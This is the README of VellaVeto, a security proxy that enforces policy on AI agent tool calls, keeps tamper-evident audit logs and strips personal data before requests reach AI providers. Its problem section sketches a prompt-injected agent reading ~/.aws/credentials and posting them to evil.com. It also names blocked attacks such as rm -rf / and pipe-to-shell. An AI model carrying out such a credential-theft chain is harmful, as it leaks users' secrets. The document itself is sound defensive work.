<div align="center">
  <br>
  <img src="vellaveto_brandkit/docs/readme-header.png" alt="VellaVeto — Agentic Security Control Plane" width="720">
  <br><br>
  <p>
    <a href="https://github.com/vellaveto/vellaveto/releases"><img src="https://img.shields.io/badge/version-6.0.0-blue.svg" alt="Version 6.0.0"></a>
    <a href="https://github.com/vellaveto/vellaveto/actions/workflows/ci.yml"><img src="https://github.com/vellaveto/vellaveto/actions/workflows/ci.yml/badge.svg?branch=main" alt="CI"></a>
    <a href="https://github.com/vellaveto/vellaveto/stargazers"><img src="https://img.shields.io/github/stars/vellaveto/vellaveto?style=flat&logo=github&label=stars" alt="GitHub Stars"></a>
    <a href="LICENSING.md"><img src="https://img.shields.io/badge/license-MPL--2.0_/_Apache--2.0_/_BUSL--1.1-blue.svg" alt="License: Three-tier"></a>
    <a href="https://www.rust-lang.org/"><img src="https://img.shields.io/badge/MSRV-1.88.0-orange.svg?logo=rust" alt="MSRV 1.88.0"></a>
    <img src="https://img.shields.io/badge/tests-9%2C800%2B_passing-brightgreen.svg" alt="Tests: 9,800+ passing">
    <img src="https://img.shields.io/badge/clippy-zero_warnings-brightgreen.svg" alt="Clippy: zero warnings">
    <a href="docs/SECURITY_GUARANTEES.md"><img src="https://img.shields.io/badge/internal_security_audits-232_rounds-orange.svg" alt="232 Internal Security Audit Rounds"></a>
    <a href="formal/"><img src="https://img.shields.io/badge/formal_verification-TLA%2B_%7C_Lean_4_%7C_Coq-blueviolet.svg" alt="Formal Verification: TLA+ | Lean 4 | Coq"></a>
    <a href="https://modelcontextprotocol.io/specification/2025-11-25"><img src="https://img.shields.io/badge/MCP-2025--11--25-blueviolet.svg" alt="MCP 2025-11-25"></a>
    <a href="https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/"><img src="https://img.shields.io/badge/OWASP-Agentic_Top_10-red.svg" alt="OWASP Agentic Top 10"></a>
    <a href="https://github.com/vellaveto/vellaveto/actions/workflows/provenance-sbom.yml"><img src="https://img.shields.io/badge/SLSA-Level_3-green.svg" alt="SLSA Level 3"></a>
    <a href="https://github.com/vellaveto/vellaveto/actions/workflows/codeql.yml"><img src="https://github.com/vellaveto/vellaveto/actions/workflows/codeql.yml/badge.svg?branch=main" alt="CodeQL"></a>
  </p>
  <p>
    <a href="#the-problem">The Problem</a> &middot;
    <a href="#consumer-shield--protect-users-from-ai-providers">Shield</a> &middot;
    <a href="#quick-start">Quick Start</a> &middot;
    <a href="#how-it-compares">Compare</a> &middot;
    <a href="#security">Security</a> &middot;
    <a href="#architecture">Architecture</a> &middot;
    <a href="#documentation">Docs</a>
  </p>
</div>

---

**VellaVeto is a runtime security engine for AI agent tool calls.** It intercepts [MCP](https://modelcontextprotocol.io/) and function-calling requests, enforces security policies on paths, domains, and actions, and maintains a tamper-evident audit trail. Deploy it as a stdio proxy, HTTP gateway, multi-tenant control plane, or consumer-side privacy shield.

## The Problem

AI agents can read files, make HTTP requests, and execute commands. Without centralized controls:

```
Agent receives prompt injection
  → reads ~/.aws/credentials
  → POST https://evil.com/exfil?data=AKIA...
  → no audit trail, no one notices
```

This is not hypothetical. The MCP ecosystem has accumulated [30+ CVEs](https://www.practical-devsecops.com/mcp-security-vulnerabilities/) in 15 months: command injection in `mcp-remote` ([CVE-2025-6514](https://nvd.nist.gov/vuln/detail/CVE-2025-6514)), path traversal in Anthropic's official Git MCP server ([CVE-2025-68143/44/45](https://github.com/anthropics/anthropic-cookbook/security/advisories)), [SANDWORM](docs/THREAT_MODEL.md) npm supply-chain worms injecting rogue MCP servers into AI configs, and [SmartLoader](https://blog.morphisec.com/smartloader-malware-targets-manufacturing) trojans distributed as MCP packages. [8,000+ MCP servers](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) have been found exposed with no authentication.

VellaVeto sits between AI agents and tool servers. Every tool call is evaluated against policy before execution. No policy match, missing context, or evaluation error results in `Deny`. Every decision is logged in a tamper-evident chain.

```
Agent attempts: read_file("/home/user/.aws/credentials")
  → VellaVeto evaluates against policy
  → Deny { reason: "path blocked by credential-protection rule" }
  → Logged with SHA-256 chain + Ed25519 checkpoint
  → Agent never sees the file contents
```

## Consumer Shield — Protect Users from AI Providers

Enterprise security is half the story. When AI providers process tool calls through their infrastructure, they see your file paths, credentials, browsing patterns, and work context. The [Consumer Shield](examples/presets/consumer-shield.toml) is a user-side deployment mode that protects individuals from mass data collection — regardless of what the provider's terms of service say.

```
You type: "Read my medical records at /home/alice/health/lab-results.pdf"
  → Shield intercepts before the provider sees it
  → PII replaced: "Read my medical records at [PII_PATH_1]"
  → Provider processes the sanitized request
  → Response comes back, Shield restores original paths
  → Encrypted local audit proves what was shared and what was stripped
```

**What the Shield does:**

| Layer | What It Protects | How |
|---|---|---|
| **PII sanitization** | File paths, emails, IPs, names, credentials | Bidirectional replacement with `[PII_{CAT}_{SEQ}]` placeholders — provider never sees originals |
| **Encrypted local audit** | Full interaction history | XChaCha20-Poly1305 + Argon2id, stored on your machine, not the provider's |
| **Session isolation** | Cross-session correlation | Each session gets a fresh credential — provider cannot link sessions to build a profile |
| **Credential vault** | API keys, tokens passed through tool calls | Blind credential binding — provider sees the tool call but not the credential value |
| **Stylometric resistance** | Writing style fingerprinting | Whitespace, punctuation, emoji, and filler word normalization so your writing patterns are not identifiable |
| **Warrant canary** | Legal compulsion transparency | Ed25519-signed canary — if it stops being updated, assume legal pressure |

The Shield runs locally as `vellaveto-shield` and is licensed under **MPL-2.0** — no enterprise license required.

```bash
vellaveto-shield --config consumer-shield.toml -- npx @anthropic/claude-desktop
```

## What It Does

VellaVeto is not just a proxy or firewall — it is a security control plane for agentic systems:

- **Policy engine** — glob/regex/domain matching, parameter constraints, time windows, call limits, Cedar-style ABAC, Wasm plugins. <5ms P99 evaluation.
- **Threat detection** — injection, tool squatting, rug pulls, schema poisoning, DLP, memory poisoning, multi-agent collusion. 20+ detection layers, not just regex.
- **Identity and access** — OAuth 2.1/JWT, OIDC/SAML, RBAC, capability delegation, DPoP (RFC 9449), non-human identity lifecycle.
- **Topology discovery** — auto-discover MCP servers, tools, and resources. Detect drift, tool shadowing, and namespace collisions.
- **Audit and compliance** — tamper-evident logs (SHA-256 + Merkle + Ed25519), ZK proofs, evidence packs mapped to EU AI Act, SOC 2, DORA, NIS2, NIST AI 600-1, and 7 more frameworks.
- **Consumer shield** — all of the above, running user-side. See [Consumer Shield](#consumer-shield--protect-users-from-ai-providers).

**Core guarantees:**
- **Complete mediation** — request and response paths evaluated before tool execution and before model return
- **Fail-closed** — errors, missing policies, and unresolved context all produce `Deny`
- **Tamper-evident audit** — SHA-256 hash chain + Merkle proofs + Ed25519 signed checkpoints
- **Public security contract** — [Security Guarantees](docs/SECURITY_GUARANTEES.md) + [Assurance Case](docs/ASSURANCE_CASE.md) with reproducible evidence

## Quick Start

### Instant Protection

Pick a protection level and go — no config file needed:

```bash
# Install (pick one):
cargo install vellaveto-proxy                 # From source (~2 min)
# or download pre-built binary from https://github.com/vellaveto/vellaveto/releases

# Shield — blocks credentials + dangerous commands, injection/DLP scanning
vellaveto-proxy --protect shield -- npx @modelcontextprotocol/server-filesystem /tmp

# Fortress — shield + exfil domain blocking, AI config protection, approval gates
vellaveto-proxy --protect fortress -- python -m mcp_server

# Vault — fortress + default deny (must whitelist what you need)
vellaveto-proxy --protect vault -- ./my-server
```

| Level | Default | What it blocks | For whom |
|-------|---------|----------------|----------|
| `shield` | Allow | Credentials, dangerous commands, injection, credential leaks | Anyone — just works |
| `fortress` | Allow | Shield + exfil domains, AI config files, git hooks; approval for destructive ops | Developers who want more |
| `vault` | **Deny** | Everything not explicitly allowed | Maximum security |

See it in action: run [`demos/demo-client.py`](demos/) to watch VellaVeto block credential theft, `rm -rf /`, and pipe-to-shell attacks while allowing safe operations.

### Setup Wizard

```bash
npx create-vellaveto
```

### Custom Config

```bash
vellaveto-proxy --config policy.toml -- /path/to/mcp-server
```

### HTTP Reverse Proxy (deployed MCP servers)

```bash
cargo install vellaveto-http-proxy
VELLAVETO_API_KEY=$(openssl rand -hex 32) vellaveto-http-proxy \
  --upstream http://localhost:8000/mcp \
  --config policy.toml \
  --listen 127.0.0.1:3001
```

### Docker

```bash
docker pull ghcr.io/vellaveto/vellaveto:latest
docker run -p 3000:3000 \
  -v /path/to/config.toml:/etc/vellaveto/config.toml:ro \
  ghcr.io/vellaveto/vellaveto:latest
```

### Use with Claude Desktop

Edit `~/Library/Application Support/Claude/claude_desktop_config.json` (macOS) or `%APPDATA%\Claude\claude_desktop_config.json` (Windows):

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "vellaveto-proxy",
      "args": [
        "--protect", "shield",
        "--", "npx", "-y",
        "@modelcontextprotocol/server-filesystem", "/home/user/projects"
      ]
    }
  }
}
```

### Use with Cursor

Edit `.cursor/mcp.json` in your project directory:

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "vellaveto-proxy",
      "args": [
        "--protect", "fortress",
        "--", "npx", "-y",
        "@modelcontextprotocol/server-filesystem", "."
      ]
    }
  }
}
```

Replace `shield`/`fortress` with `vault` for maximum security. See [docs/QUICKSTART.md](docs/QUICKSTART.md) for SDK integration guides (Anthropic, OpenAI, LangChain, LangGraph, CrewAI).

## How It Works

```
                    +------------------+
  AI Agent -------->|    VellaVeto     |--------> Tool Server
                    |                  |
                    |  1. Parse action |
                    |  2. Match policy |
                    |  3. Evaluate     |
                    |     constraints  |
                    |  4. Allow / Deny |
                    |  5. Audit log    |
                    +--------+---------+
                             |
                    Tamper-evident log
                    (SHA-256 chain +
                     Ed25519 signatures)
```

## Architecture

```mermaid
graph TD
    subgraph "Policy Core"
        VT[vellaveto-types] --> VCfg[vellaveto-config]
        VT --> VCan[vellaveto-canonical]
        VT --> VE[vellaveto-engine]
        VT --> VDisc[vellaveto-discovery]
        VE --> VA[vellaveto-audit]
        VE --> VAppr[vellaveto-approval]
    end

    subgraph "Gateway & Control Plane"
        VA --> VMCP[vellaveto-mcp]
        VCfg --> VP[vellaveto-proxy]
        VMCP --> VP
        VMCP --> VHP[vellaveto-http-proxy]
        VMCP --> VServer[vellaveto-server]
        VCfg --> VCluster[vellaveto-cluster]
        VCluster --> VOp[vellaveto-operator]
    end

    subgraph "Consumer & Ecosystem"
        VS[vellaveto-shield] --> MS[vellaveto-mcp-shield]
        VS --> HS[vellaveto-http-proxy-shield]
        VS --> VC[vellaveto-canary]
        MCPSEC[mcpsec]
    end

    MS --> VMCP
    HS --> VHP
    VC --> VA
```

Lower crates never depend on higher crates. `vellaveto-operator` is standalone (kube-rs, no internal deps). License tiers are documented separately in [LICENSING.md](LICENSING.md).

## Key Capabilities

| | What It Does | Docs |
|---|---|---|
| **Policy Engine** | Glob/regex/domain matching, parameter constraints, time windows, call limits, action sequences, Cedar-style ABAC, Wasm plugins. Pre-compiled patterns, <5ms P99, decision cache. | [Policy](docs/POLICY.md) |
| **Threat Detection** | 20+ detection layers: injection (Aho-Corasick + NFKC + obfuscation decode), tool squatting, rug pulls, schema poisoning, DLP, memory poisoning, multi-agent collusion. Maps to [OWASP Agentic Top 10](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/). | [Threat Model](docs/THREAT_MODEL.md) |
| **Identity & Access** | OAuth 2.1/JWT, OIDC/SAML, RBAC (4 roles, 14 perms), ABAC with forbid-overrides, capability delegation, DPoP (RFC 9449), non-human identity lifecycle. | [IAM](docs/IAM.md) |
| **Discovery** | Auto-discover MCP servers, tools, resources via topology graph. Detect drift, tool shadowing, namespace collisions. Topology guard as pre-policy filter. | [Architecture](#architecture) |
| **Audit & Compliance** | Tamper-evident logs (SHA-256 + Merkle + Ed25519), ZK proofs (Pedersen + Groth16), evidence packs for EU AI Act, SOC 2, DORA, NIS2, NIST AI 600-1, ISO 42001, and 6 more. | [Security Guarantees](docs/SECURITY_GUARANTEES.md) |
| **Consumer Shield** | User-side PII sanitization, encrypted local audit (XChaCha20-Poly1305), session isolation, credential vault, stylometric fingerprint resistance, warrant canary. | [Consumer Shield](examples/presets/consumer-shield.toml) |
| **Deployment** | 6 modes: HTTP, stdio, WebSocket, gRPC, gateway, consumer shield. K8s operator (3 CRDs), Helm chart, Terraform provider, VS Code extension. | [Deployment](docs/DEPLOYMENT.md) |

## Security

### Internal Adversarial Auditing

VellaVeto has undergone **232 rounds of internal adversarial security auditing** covering 31+ attack classes mapped to the [OWASP Top 10 for Agentic Applications](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/). These are not third-party audits — they are systematic internal red-team exercises where we attack our own code, document findings, fix them, and verify the fixes. 1,550+ findings resolved. The methodology and findings are documented in the [changelog](CHANGELOG.md) and [security review](docs/SECURITY_REVIEW.md).

- **Fail-closed everywhere** — empty policy sets, missing parameters, lock poisoning, capacity exhaustion, and evaluation errors all produce `Deny`
- **Zero `unwrap()` in library code** — all error paths return typed errors; panics reserved for tests only
- **9,800+ tests** — Rust, Python, Go, TypeScript, Java, Terraform, React, shell + 24 fuzz targets, zero warnings
- **Post-quantum ready** — Hybrid Ed25519 + ML-DSA-65 (FIPS 204) audit signatures, feature-gated behind `pqc-hybrid`

### Formal Verification

We use formal methods to prove — not just test — critical security properties:

| Tool | What's Proven | Files |
|---|---|---|
| **TLA+** | Policy engine determinism, ABAC forbid-override correctness, workflow constraint enforcement, task lifecycle safety, cascading failure recovery | [formal/tla/](formal/tla/) |
| **Lean 4** | Fail-closed property (errors → Deny), evaluation determinism, path normalization idempotence | [formal/lean/](formal/lean/) |
| **Coq** | 15 theorems: fail-closed, determinism, ABAC forbid-override, capability delegation attenuation | [formal/coq/](formal/coq/) |
| **Alloy** | Capability delegation cannot escalate privileges | [formal/alloy/](formal/alloy/) |
| **Kani** | 5 proof harnesses for Rust implementation correctness | [formal/kani/](formal/kani/) |

Formal verification is rare in security tooling. We believe the properties that matter most — fail-closed behavior, determinism, no privilege escalation — should be proven, not just tested. See [formal/README.md](formal/README.md) for details.

### Known Limitations

Injection detection is a pre-filter, not a security boundary. DLP does not detect secrets split across multiple calls. No TLS termination (use a reverse proxy). The internal audit process is thorough but is not a substitute for independent third-party review. See [Security Guarantees](docs/SECURITY_GUARANTEES.md) for the full normative contract.

Full details: [Security Guarantees](docs/SECURITY_GUARANTEES.md) | [Threat Model](docs/THREAT_MODEL.md) | [Assurance Case](docs/ASSURANCE_CASE.md)

## How It Compares

| | **VellaVeto** | **AgentGateway** | **MCP-Scan (Snyk)** | **Lasso Gateway** |
|---|---|---|---|---|
| **Language** | Rust | Rust | Python | Python |
| **Backing** | Independent | Linux Foundation / Solo.io | Snyk (acquired Invariant Labs) | Lasso Security (~$28M raised) |
| **Stars** | New | ~1,800 | ~1,700 | ~349 |
| **Primary role** | Runtime policy engine + firewall | Connectivity proxy / gateway | Scanner + monitor | Security gateway (plugin-based) |
| **Evaluation latency** | <5ms P99 | Not published | N/A (scan-time) | Not published |
| **Policy engine** | Glob/regex/domain, ABAC, Cedar, Wasm plugins, time windows, call sequences | Basic authorization | No policy engine | Plugin-based guardrails |
| **Injection detection** | 20+ layers (Aho-Corasick, NFKC, ROT13, base64, math symbols, leetspeak, emoji smuggling, FlipAttack, memory poisoning, schema poisoning, ...) | None | Tool description scanning | Guardrail plugins |
| **DLP** | 5-layer decode + credential patterns | None | None | Presidio plugin |
| **Transport coverage** | HTTP, WebSocket, gRPC, stdio, SSE (verified parity) | MCP + A2A | MCP (stdio) | MCP (stdio, SSE) |
| **Audit trail** | SHA-256 chain + Merkle + Ed25519 + ZK proofs + PostgreSQL | Observability hooks | Logging | Logging |
| **Compliance** | 12 frameworks (EU AI Act, SOC 2, DORA, NIS2, ...) | None | None | None |
| **Formal verification** | TLA+, Lean 4, Coq, Alloy, Kani | None | None | None |
| **Consumer privacy** | PII sanitization, session isolation, credential vault, stylometric resistance | None | None | PII scanning (Presidio) |
| **Enterprise IAM** | OIDC, SAML, RBAC, SCIM, DPoP | None | None | None |
| **Ease of setup** | `--protect shield` (one flag) / Docker / Helm | Docker / binary | `pip install` | `pip install` |
| **License** | MPL-2.0 / Apache-2.0 / BUSL-1.1 | Apache-2.0 | Apache-2.0 | MIT |

**Trade-offs:** AgentGateway and MCP-Scan have strong institutional backing (Linux Foundation, Snyk) and larger communities. AgentGateway excels as a connectivity layer for routing agent traffic; MCP-Scan excels at static vulnerability scanning of MCP server configurations. Neither is a runtime policy engine — they solve adjacent problems. Lasso Gateway and [PipeLock](https://github.com/luckyPipewrench/pipelock) (Go, single binary, ~141 stars) are closer in scope but lighter on depth. VellaVeto's `--protect shield` offers comparable ease-of-use for basic protection, but if you need compliance evidence, multi-transport parity, or formal verification, VellaVeto is the only option that provides them.

## Deployment Modes

| Mode | Command | Use Case |
|---|---|---|
| HTTP API Server | `vellaveto serve` | Dashboard, REST API, policy management |
| MCP Stdio Proxy | `vellaveto-proxy` | Claude Desktop, local MCP servers |
| HTTP Reverse Proxy | `vellaveto-http-proxy` | Deployed MCP servers, SSE/Streamable HTTP |
| WebSocket Proxy | `vellaveto-http-proxy` | Bidirectional MCP-over-WS at `/mcp/ws` |
| gRPC Proxy | `vellaveto-http-proxy --grpc` | High-throughput, protobuf-native (feature-gated) |
| Consumer Shield | `vellaveto-shield` | User-side PII protection |

See [docs/DEPLOYMENT.md](docs/DEPLOYMENT.md) for configuration details.

## Documentation

### Getting Started

| Document | Description |
|---|---|
| [Quick Start](docs/QUICKSTART.md) | Framework integration guides (Anthropic, OpenAI, LangChain, LangGraph, MCP) |
| [15-Minute Secure Start](docs/SECURE_QUICKSTART_15_MIN.md) | End-to-end deny-by-default walkthrough with audit verification |
| [Policy Configuration](docs/POLICY.md) | Policy syntax, operators, presets, elicitation, sampling, DLP |
| [CLI Reference](docs/CLI.md) | All binaries and commands |
| [Environment Variables](docs/ENV.md) | Configuration via environment |

### Security & Compliance

| Document | Description |
|---|---|
| [Security Guarantees](docs/SECURITY_GUARANTEES.md) | Normative, falsifiable security contract |
| [Threat Model](docs/THREAT_MODEL.md) | Trust boundaries, attack surfaces, mitigations |
| [Assurance Case](docs/ASSURANCE_CASE.md) | Claim -> evidence -> reproduce map |
| [Security Hardening](docs/SECURITY.md) | Security configuration best practices |
| [Quantum Migration](docs/quantum-migration.md) | PQC rollout and rollback gates |

### Operations & Architecture

| Document | Description |
|---|---|
| [Deployment Guide](docs/DEPLOYMENT.md) | Docker, Kubernetes (Helm), bare metal |
| [Operations Runbook](docs/OPERATIONS.md) | Monitoring, troubleshooting, maintenance |
| [API Reference](docs/API.md) | Complete HTTP API (135+ endpoints) |
| [Audit Log](docs/AUDIT_LOG.md) | Audit system internals, verification, SIEM export |
| [IAM](docs/IAM.md) | OIDC, SAML, RBAC, session management |
| [Benchmarks](docs/BENCHMARKS.md) | Reproducible performance benchmarks |
| [Evaluation Traces](docs/EVALUATION_TRACES.md) | Decision explainability and execution graphs |

### SDKs

| SDK | Path | Tests |
|---|---|---|
| Python (sync + async, LangChain, LangGraph, CrewAI, Composio, Claude Agent, Strands) | [sdk/python/](sdk/python/) | 433 |
| TypeScript | [sdk/typescript/](sdk/typescript/) | 119 |
| Go | [sdk/go/](sdk/go/) | 127 |
| Java | [sdk/java/](sdk/java/) | 120 |

## Development

```bash
# Build
cargo build --release

# Test
cargo test --workspace

# Lint
cargo clippy --workspace --all-targets

# Format
cargo fmt --check

# Security audit
cargo audit

# Benchmarks
cargo bench --workspace

# Fuzz (requires nightly)
cd fuzz && cargo +nightly fuzz run fuzz_json_rpc_framing -- -max_total_time=60
```

See [CONTRIBUTING.md](CONTRIBUTING.md) for development rules and commit format.

### CI Policy Validation

Validate your policy config in GitHub Actions:

```yaml
- uses: vellaveto/vellaveto/.github/actions/policy-check@main
  with:
    config: vellaveto.toml
    strict: true
```

## License

| Tier | License | Crates |
|---|---|---|
| Core + Consumer | MPL-2.0 | types, engine, audit, config, canonical, discovery, approval, proxy, mcp-shield, shield |
| Canary + Benchmark | Apache-2.0 | canary, mcpsec |
| Enterprise | BUSL-1.1 → MPL-2.0 | server, http-proxy, mcp, cluster, operator, integration |

Enterprise crates are free for production use at ≤3 nodes / ≤25 endpoints. Each version converts to MPL-2.0 after 3 years. See [LICENSING.md](LICENSING.md) for full details. For managed service offerings or above-threshold deployments, contact **paolovella1993@gmail.com**.

## References

- [MCP Specification 2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25)
- [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- [OWASP Top 10 for MCP Servers](https://owasp.org/www-project-top-10-for-mcp-servers/)
- [CoSAI MCP Security Whitepaper](https://www.coalitionforsafeai.org/)
- [ETDI: Mitigating Tool Squatting and Rug Pull Attacks in MCP](https://arxiv.org/abs/2506.01333)
- [Enterprise-Grade Security for MCP](https://arxiv.org/pdf/2504.08623)
- [MCP Security Vulnerabilities — Practical DevSecOps](https://www.practical-devsecops.com/mcp-security-vulnerabilities/)
